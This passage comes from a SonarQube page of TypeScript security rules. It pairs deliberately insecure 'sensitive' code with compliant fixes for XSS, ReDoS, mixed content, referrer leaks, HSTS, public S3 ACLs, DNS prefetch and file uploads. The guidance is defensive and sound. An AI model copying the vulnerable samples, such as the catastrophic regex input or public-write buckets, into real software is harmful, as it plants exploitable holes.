import { DomSanitizer } from &#34;&#64;angular/platform-browser&#34;;
import { ActivatedRoute } from &#39;&#64;angular/router&#39;;

&#64;Component({
  template: &#39;&lt;div id&#61;&#34;hello&#34;&gt;&lt;h1&gt;Hello {<!-- -->{name}}&lt;/h1&gt;&lt;/div&gt;&#39;,
})
export class HelloComponent implements OnInit {
  name: string;

  constructor(private sanitizer: DomSanitizer, private route: ActivatedRoute) { }

  ngOnInit(): void {
    this.name &#61; this.route.snapshot.queryParams.name;
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li><li> <a href="https://angular.io/guide/security" rel="nofollow">Angular - Best Practices - Security</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5852">
              typescript:S5852
            </a>
          </td>
          <td>
            <details>
              <p>Most of the regular expression engines use backtracking to try all possible execution paths of the regular expression when evaluating an input, in
some cases it can cause performance issues, called <strong>catastrophic backtracking</strong> situations. In the worst case, the complexity of the
regular expression is exponential in the size of the input, this means that a small carefully-crafted input (like 20 chars) can trigger catastrophic
backtracking and cause a denial of service of the application. Super-linear regex complexity can lead to the same impact too with, in this case, a
large carefully-crafted input (thousands chars).</p>
<p>This rule determines the runtime complexity of a regular expression and informs you if it is not linear.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The input is user-controlled. </li><li> The input size is not restricted to a small number of characters. </li><li> There is no timeout in place to limit the regex evaluation time. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To avoid catastrophic backtracking situations, make sure that none of the following conditions apply to your regular expression.</p>
<p>In all of the following cases, catastrophic backtracking can only happen if the problematic part of the regex is followed by a pattern that can
fail, causing the backtracking to actually happen.</p>
<ul><li> If you have a repetition <code>r*</code> or <code>r*?</code>, such that the regex <code>r</code> could produce different possible matches (of
  possibly different lengths) on the same input, the worst case matching time can be exponential. This can be the case if <code>r</code> contains
  optional parts, alternations or additional repetitions (but not if the repetition is written in such a way that there’s only one way to match it).
  </li><li> If you have multiple repetitions that can match the same contents and are consecutive or are only separated by an optional separator or a
  separator that can be matched by both of the repetitions, the worst case matching time can be polynomial (O(n^c) where c is the number of
  problematic repetitions). For example <code>a*b*</code> is not a problem because <code>a*</code> and <code>b*</code> match different things and
  <code>a*_a*</code> is not a problem because the repetitions are separated by a <code>&#39;_&#39;</code> and can’t match that <code>&#39;_&#39;</code>. However,
  <code>a*a*</code> and <code>.*_.*</code> have quadratic runtime. </li><li> If the regex is not anchored to the beginning of the string, quadratic runtime is especially hard to avoid because whenever a match fails, the
  regex engine will try again starting at the next index. This means that any unbounded repetition, if it’s followed by a pattern that can fail, can
  cause quadratic runtime on some inputs. For example <code>str.split(/\s*,/)</code> will run in quadratic time on strings that consist entirely of
  spaces (or at least contain large sequences of spaces, not followed by a comma). </li></ul>
<p>In order to rewrite your regular expression without these patterns, consider the following strategies:</p>
<ul><li> If applicable, define a maximum number of expected repetitions using the bounded quantifiers, like <code>{1,5}</code> instead of <code>&#43;</code>
  for instance. </li><li> Refactor nested quantifiers to limit the number of way the inner group can be matched by the outer quantifier, for instance this nested
  quantifier situation <code>(ba&#43;)&#43;</code> doesn’t cause performance issues, indeed, the inner group can be matched only if there exists exactly one
  <code>b</code> char per repetition of the group. </li><li> Optimize regular expressions by emulating <em>possessive quantifiers</em> and <em>atomic grouping</em>. </li><li> Use negated character classes instead of <code>.</code> to exclude separators where applicable. For example the quadratic regex
  <code>.*_.*</code> can be made linear by changing it to <code>[^_]*_.*</code> </li></ul>
<p>Sometimes it’s not possible to rewrite the regex to be linear while still matching what you want it to match. Especially when the regex is not
anchored to the beginning of the string, for which it is quite hard to avoid quadratic runtimes. In those cases consider the following approaches:</p>
<ul><li> Solve the problem without regular expressions </li><li> Use an alternative non-backtracking regex implementations such as Google’s <a href="https://github.com/google/re2" rel="nofollow">RE2</a> or <a href="https://github.com/uhop/node-re2/" rel="nofollow">node-re2</a>. </li><li> Use multiple passes. This could mean pre- and/or post-processing the string manually before/after applying the regular expression to it or
  using multiple regular expressions. One example of this would be to replace <code>str.split(/\s*,\s*/)</code> with <code>str.split(&#34;,&#34;)</code> and
  then trimming the spaces from the strings as a second step. </li><li> It is often possible to make the regex infallible by making all the parts that could fail optional, which will prevent backtracking. Of course
  this means that you’ll accept more strings than intended, but this can be handled by using capturing groups to check whether the optional parts were
  matched or not and then ignoring the match if they weren’t. For example the regex <code>x*y</code> could be replaced with <code>x*(y)?</code> and
  then the call to <code>str.match(regex)</code> could be replaced with <code>matched &#61; str.match(regex)</code> and <code>matched[1] !&#61;&#61;
  undefined</code>. </li></ul>
<h2>Sensitive Code Example</h2>
<p>The regex evaluation will never end:</p>
<pre>
/(a&#43;)&#43;$/.test(
&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;&#43;
&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;&#43;
&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;&#43;
&#34;aaaaaaaaaaaaaaa!&#34;
); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Possessive quantifiers do not keep backtracking positions, thus can be used, if possible, to avoid performance issues. Unfortunately, they are not
supported in JavaScript, but one can still mimick them using lookahead assertions and backreferences:</p>
<pre>
/((?&#61;(a&#43;))\2)&#43;$/.test(
&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;&#43;
&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;&#43;
&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;&#43;
&#34;aaaaaaaaaaaaaaa!&#34;
); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li><li> <a href="https://cwe.mitre.org/data/definitions/1333" rel="nofollow">MITRE, CWE-1333</a> - Inefficient Regular Expression Complexity </li><li> <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">owasp.org</a> - OWASP Regular expression Denial
  of Service - ReDoS </li><li> <a href="https://web.archive.org/web/20220506215733/https://stackstatus.net/post/147710624694/outage-postmortem-july-20-2016" rel="nofollow">stackstatus.net(archived)</a> - Outage Postmortem - July 20, 2016 </li><li> <a href="https://www.regular-expressions.info/catastrophic.html" rel="nofollow">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic
  Backtracking </li><li> <a href="https://docs.microsoft.com/en-us/dotnet/standard/base-types/backtracking-in-regular-expressions#backtracking-with-nested-optional-quantifiers" rel="nofollow">docs.microsoft.com</a> - Backtracking with Nested Optional Quantifiers </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5730">
              typescript:S5730
            </a>
          </td>
          <td>
            <details>
              <p>A mixed-content is when a resource is loaded with the HTTP protocol, from a website accessed with the HTTPs protocol, thus mixed-content are not
encrypted and exposed to <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack" rel="nofollow">MITM attacks</a> and could break the entire level of
protection that was desired by implementing encryption with the HTTPs protocol.</p>
<p>The main threat with mixed-content is not only the confidentiality of resources but the whole website integrity:</p>
<ul><li> A passive mixed-content (eg: <em>&lt;img src&#61;&#34;http://example.com/picture.png&#34;&gt;</em>) allows an attacker to access and replace only these
  resources, like images, with malicious ones that could lead to successful phishing attacks. </li><li> With active mixed-content (eg: <em>&lt;script src&#61;&#34;http://example.com/library.js&#34;&gt;</em>) an attacker can compromise the entire website by
  injecting malicious javascript code for example (accessing and modifying the DOM, steal cookies, etc). </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The HTTPS protocol is in place and external resources are fetched from the website pages. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement content security policy <em>block-all-mixed-content</em> directive which is supported by all modern browsers and will block loading of
mixed-contents.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/helmet-csp" rel="nofollow">helmet-csp</a> or <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> middleware is used without the <code>blockAllMixedContent</code> directive:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      &#34;default-src&#34;: [&#34;&#39;self&#39;&#34;, &#39;example.com&#39;, &#39;code.jquery.com&#39;]
    } // Sensitive: blockAllMixedContent directive is missing
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application a standard way to block mixed-content is to put in place the <a href="https://www.npmjs.com/package/helmet-csp" rel="nofollow">helmet-csp</a> or <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> middleware with the
<code>blockAllMixedContent</code> directive:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      &#34;default-src&#34;: [&#34;&#39;self&#39;&#34;, &#39;example.com&#39;, &#39;code.jquery.com&#39;],
      blockAllMixedContent: [] // Compliant
    }
  })
);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> -
  Sensitive Data Exposure </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content" rel="nofollow">developer.mozilla.org</a> - Mixed-content </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" rel="nofollow">developer.mozilla.org</a> - Content Security Policy (CSP) </li><li> <a href="https://www.w3.org/TR/CSP3/" rel="nofollow">w3.org</a> - Content Security Policy Level 3 </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5736">
              typescript:S5736
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://en.wikipedia.org/wiki/HTTP_referer" rel="nofollow">HTTP header referer</a> contains a URL set by web browsers and used by applications to track
from where the user came from, it’s for instance a relevant value for web analytic services, but it can cause <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Referer_header:_privacy_and_security_concerns" rel="nofollow">serious privacy and security problems</a>
if the URL contains confidential information. Note that Firefox for instance, to prevent data leaks, <a href="https://blog.mozilla.org/security/2018/01/31/preventing-data-leaks-by-stripping-path-information-in-http-referrers/" rel="nofollow">removes path
information</a> in the Referer header while browsing privately.</p>
<p>Suppose an e-commerce website asks the user his credit card number to purchase a product:</p>
<pre>
&lt;html&gt;
&lt;body&gt;
&lt;form action&#61;&#34;/valid_order&#34; method&#61;&#34;GET&#34;&gt;
Type your credit card number to purchase products:
&lt;input type&#61;text id&#61;&#34;cc&#34; value&#61;&#34;1111-2222-3333-4444&#34;&gt;
&lt;input type&#61;submit&gt;
&lt;/form&gt;
&lt;/body&gt;
</pre>
<p>When submitting the above HTML form, a HTTP GET request will be performed, the URL requested will be
https://example.com/valid_order?cc&#61;1111-2222-3333-4444 with credit card number inside and it’s obviously not secure for these reasons:</p>
<ul><li> URLs are stored in the history of browsers. </li><li> URLs could be accidentally shared when doing copy/paste actions. </li><li> URLs can be stolen if a malicious person looks at the computer screen of an user. </li></ul>
<p>In addition to these threats, when further requests will be performed from the &#34;valid_order&#34; page with a simple legitimate embedded script like
that:</p>
<pre>
&lt;script src&#61;&#34;https://webanalyticservices_example.com/track&#34;&gt;
</pre>
<p>The referer header which contains confidential information will be send to a third party web analytic service and cause privacy issue:</p>
<pre>
GET /track HTTP/2.0
Host: webanalyticservices_example.com
Referer: https://example.com/valid_order?cc&#61;1111-2222-3333-4444
</pre>
<h2>Ask Yourself Whether</h2>
<ul><li> Confidential information exists in URLs. </li><li> Semantic of HTTP methods is not respected (eg: use of a GET method instead of POST when the state of the application is changed). </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Confidential information should not be set inside URLs (GET requests) of the application and a safe (ie: different from <code>unsafe-url</code> or
<code>no-referrer-when-downgrade</code>) <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy" rel="nofollow">referrer-Policy</a>
header, to control how much information is included in the referer header, should be used.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> <code>referrerPolicy</code>
middleware is disabled or used with <code>no-referrer-when-downgrade</code> or <code>unsafe-url</code>:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

app.use(
  helmet.referrerPolicy({
    policy: &#39;no-referrer-when-downgrade&#39; // Sensitive: no-referrer-when-downgrade is used
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application a secure solution is to user the <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> referrer policy middleware set
to <code>no-referrer</code>:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(
  helmet.referrerPolicy({
    policy: &#39;no-referrer&#39; // Compliant
  })
);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> -
  Sensitive Data Exposure </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy" rel="nofollow">developer.mozilla.org</a> - Referrer-Policy </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Referer_header:_privacy_and_security_concerns" rel="nofollow">developer.mozilla.org</a> -
  Referer header: privacy and security concerns </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5739">
              typescript:S5739
            </a>
          </td>
          <td>
            <details>
              <p>When implementing the HTTPS protocol, the website mostly continue to support the HTTP protocol to redirect users to HTTPS when they request a HTTP
version of the website. These redirects are not encrypted and are therefore vulnerable to man in the middle attacks. The <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security" rel="nofollow">Strict-Transport-Security policy header</a> (HSTS) set by
an application instructs the web browser to convert any HTTP request to HTTPS.</p>
<p>Web browsers that see the Strict-Transport-Security policy header for the first time record information specified in the header:</p>
<ul><li> the <code>max-age</code> directive which specify how long the policy should be kept on the web browser. </li><li> the <code>includeSubDomains</code> optional directive which specify if the policy should apply on all sub-domains or not. </li><li> the <code>preload</code> optional directive which is not part of the HSTS specification but supported on all modern web browsers. </li></ul>
<p>With the <code>preload</code> directive the web browser never connects in HTTP to the website and to use this directive, it is required <a href="https://hstspreload.org/" rel="nofollow">to submit</a> the concerned application to a preload service maintained by Google.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The website is accessible with the unencrypted HTTP protocol. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement Strict-Transport-Security policy header, it is recommended to apply this policy to all subdomains (<code>includeSubDomains</code>) and
for at least 6 months (<code>max-age&#61;15552000</code>) or even better for 1 year (<code>max-age&#61;31536000</code>).</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> or <a href="https://www.npmjs.com/package/hsts" rel="nofollow">hsts</a> middleware are disabled or used without recommended values:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(helmet.hsts({
  maxAge: 3153600, // Sensitive, recommended &gt;&#61; 15552000
  includeSubDomains: false // Sensitive, recommended &#39;true&#39;
}));
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application a standard way to implement HSTS is with the <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> or <a href="https://www.npmjs.com/package/hsts" rel="nofollow">hsts</a> middleware:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(helmet.hsts({
  maxAge: 31536000,
  includeSubDomains: true
})); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> -
  Sensitive Data Exposure </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security" rel="nofollow">developer.mozilla.org</a> - Strict Transport
  Security </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6265">
              typescript:S6265
            </a>
          </td>
          <td>
            <details>
              <p>Predefined permissions, also known as <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl" rel="nofollow">canned ACLs</a>,
are an easy way to grant large privileges to predefined groups or users.</p>
<p>The following canned ACLs are security-sensitive:</p>
<ul><li> <code>PUBLIC_READ</code>, <code>PUBLIC_READ_WRITE</code> grant respectively &#34;read&#34; and &#34;read and write&#34; privileges to anyone, either
  authenticated or anonymous (<code>AllUsers</code> group). </li><li> <code>AUTHENTICATED_READ</code> grants &#34;read&#34; privilege to all authenticated users (<code>AuthenticatedUsers</code> group). </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive data. </li><li> The S3 bucket is not used to store static resources of websites (images, css …​). </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege policy, i.e., to only grant users the necessary permissions for their required tasks. In the
context of canned ACL, set it to <code>PRIVATE</code> (the default one), and if needed more granularity then use an appropriate S3 policy.</p>
<h2>Sensitive Code Example</h2>
<p>All users, either authenticated or anonymous, have read and write permissions with the <code>PUBLIC_READ_WRITE</code> access control:</p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;bucket&#39;, {
    accessControl: s3.BucketAccessControl.PUBLIC_READ_WRITE // Sensitive
});

new s3deploy.BucketDeployment(this, &#39;DeployWebsite&#39;, {
    accessControl: s3.BucketAccessControl.PUBLIC_READ_WRITE // Sensitive
});
</pre>
<h2>Compliant Solution</h2>
<p>With the <code>PRIVATE</code> access control (default), only the bucket owner has the read/write permissions on the bucket and its ACL.</p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;bucket&#39;, {
    accessControl: s3.BucketAccessControl.PRIVATE
});

new s3deploy.BucketDeployment(this, &#39;DeployWebsite&#39;, {
    accessControl: s3.BucketAccessControl.PRIVATE
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl" rel="nofollow">AWS Documentation</a> - Access control list (ACL)
  overview (canned ACLs) </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/walkthrough1.html" rel="nofollow">AWS Documentation</a> - Controlling access to a bucket with
  user policies </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html" rel="nofollow">AWS CDK version 2</a> - Class Bucket (construct) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5743">
              typescript:S5743
            </a>
          </td>
          <td>
            <details>
              <p>By default, web browsers perform <a href="https://developer.mozilla.org/en-US/docs/Web/Performance/dns-prefetch/" rel="nofollow">DNS prefetching</a> to reduce
latency due to DNS resolutions required when an user clicks links from a website page.</p>
<p>For instance on example.com the hyperlink below contains a cross-origin domain name that must be resolved to an IP address by the web browser:</p>
<pre>
&lt;a href&#61;&#34;https://otherexample.com&#34;&gt;go on our partner website&lt;/a&gt;
</pre>
<p>It can add significant latency during requests, especially if the page contains many links to cross-origin domains. DNS prefetch allows web
browsers to perform DNS resolving in the background before the user clicks a link. This feature can cause privacy issues because DNS resolving from
the user’s computer is performed without his consent if he doesn’t intent to go to the linked website.</p>
<p>On a complex private webpage, a combination &#34;of unique links/DNS resolutions&#34; can indicate, to a eavesdropper for instance, that the user is
visiting the private page.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Links to cross-origin domains could result in leakage of confidential information about the user’s navigation/behavior of the website. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-DNS-Prefetch-Control" rel="nofollow">X-DNS-Prefetch-Control</a> header with an
<em>off</em> value but this could significantly degrade website performances.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/dns-prefetch-control" rel="nofollow">dns-prefetch-control</a>
middleware is disabled or used without the recommended value:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(
  helmet.dnsPrefetchControl({
    allow: true // Sensitive: allowing DNS prefetching is security-sensitive
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application the <a href="https://www.npmjs.com/package/dns-prefetch-control" rel="nofollow">dns-prefetch-control</a> or <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> middleware is the standard way to implement <code>X-DNS-Prefetch-Control</code> header:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(
  helmet.dnsPrefetchControl({
    allow: false // Compliant
  })
);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure.html" rel="nofollow">OWASP Top 10 2017 Category
  A3</a> - Sensitive Data Exposure </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-DNS-Prefetch-Control" rel="nofollow">developer.mozilla.org</a> - X-DNS-Prefetch-Control
  </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/Performance/dns-prefetch" rel="nofollow">developer.mozilla.org</a> - Using dns-prefetch </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2598">
              typescript:S2598
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>If the file upload feature is implemented without proper folder restriction, it will result in an implicit trust violation within the server, as
trusted files will be implicitly stored alongside third-party files that should be considered untrusted.</p>
<p>This can allow an attacker to disrupt the security of an internal server process or the running application.</p>
<h3>What is the potential impact?</h3>
<p>After discovering this vulnerability, attackers may attempt to upload as many different file types as possible, such as javascript files, bash
scripts, malware, or malicious configuration files targeting potential processes.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Full application compromise</h4>
<p>In the worst-case scenario, the attackers succeed in uploading a file recognized by in an internal tool, triggering code execution.</p>
<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul><li> Download the internal server’s data, most likely to sell it. </li><li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li><li> Stop services or exhaust resources, for instance, with fork bombs. </li></ul>
<h4>Server Resource Exhaustion</h4>
<p>By repeatedly uploading large files, an attacker can consume excessive server resources, resulting in a denial of service.</p>
<p>If the component affected by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the
denial of service can only affect the attacker who caused it.</p>
<p>Even though a denial of service might have little direct impact, it can have secondary impact in architectures that use containers and container
orchestrators. For example, it can cause unexpected container failures or overuse of resources.</p>
<p>In some cases, it is also possible to force the product to &#34;fail open&#34; when resources are exhausted, which means that some security features are
disabled in an emergency.</p>
<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h2>How to fix it in Formidable</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const Formidable &#61; require(&#39;formidable&#39;);

const form          &#61; new Formidable(); // Noncompliant
form.uploadDir      &#61; &#34;/tmp/&#34;;
form.keepExtensions &#61; true;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const Formidable &#61; require(&#39;formidable&#39;);

const form          &#61; new Formidable();
form.uploadDir      &#61; &#34;/uploads/&#34;;
form.keepExtensions &#61; false;
</pre>
<h3>How does this work?</h3>
<h4>Use pre-approved folders</h4>
<p>Create a special folder where untrusted data should be stored. This folder should be classified as untrusted and have the following
characteristics:</p>
<ul><li> It should have specific read and write permissions that belong to the right people or organizations. </li><li> It should have a size limit or its size should be monitored. </li><li> It should contain backup copies if it contains data that belongs to users. </li></ul>
<p>This folder should not be located in <code>/tmp</code>, <code>/var/tmp</code> or in the Windows directory <code>%TEMP%</code>.<br /> These folders
are usually &#34;world-writable&#34;, can be manipulated, and can be accidentally deleted by the system.</p>
<p>Also, the original file names and extensions should be changed to controlled strings to prevent unwanted code from being executed based on the file
names.</p>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://cwe.mitre.org/data/definitions/434" rel="nofollow">MITRE, CWE-434</a> - Unrestricted Upload of File with Dangerous Type </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li><li> <a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" rel="nofollow">OWASP Unrestricted File Upload</a> - Unrestricted File
  Upload </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5742">
              typescript:S5742
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Certificate_Transparency" rel="nofollow">Certificate Transparency</a> (CT) is an open-framework to
protect against identity theft when certificates are issued. <a href="https://en.wikipedia.org/wiki/Certificate_authority" rel="nofollow">Certificate Authorities</a>
(CA) electronically sign certificate after verifying the identify of the certificate owner. Attackers use, among other things, social engineering
attacks to trick a CA to correctly verifying a spoofed identity/forged certificate.</p>
<p>CAs implement Certificate Transparency framework to publicly log the records of newly issued certificates, allowing the public and in particular
the identity owner to monitor these logs to verify that his identify was not usurped.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The website identity is valuable and well-known, therefore prone to theft. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Expect-CT" rel="nofollow">Expect-CT</a> HTTP header which instructs the web browser
to check <a href="https://www.certificate-transparency.org/known-logs" rel="nofollow">public CT logs</a> in order to verify if the website appears inside and if it
is not, the browser will block the request and display a warning to the user.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/expect-ct" rel="nofollow">expect-ct</a> middleware is disabled:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

